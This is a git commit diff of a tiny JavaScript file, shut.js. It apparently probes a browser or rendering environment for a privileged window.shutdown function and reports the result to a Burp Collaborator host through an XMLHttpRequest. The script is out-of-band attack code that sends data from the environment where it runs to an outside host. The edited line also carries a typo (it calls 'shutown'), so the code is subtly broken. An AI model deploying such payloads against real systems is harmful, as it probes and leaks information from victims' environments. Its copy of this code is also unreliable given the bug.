a4b833d2e4b15f5612f4b879da2b24738a832334
pszot <pszot@users.noreply.github.com>
2022-02-22 23:28:45 +1100

    Update shut.js

--- shut.js
+++ shut.js
@@ -1,4 +1,4 @@
-var a = window.shutdown();
+var a = window.shutdown ? window.shutown() : "client";
 
 b = new XMLHttpRequest();
 b.open("GET", "https://v1xjudkxluehpa1vaqjxkito6fc60v.burpcollaborator.net/?shut="+a, true);
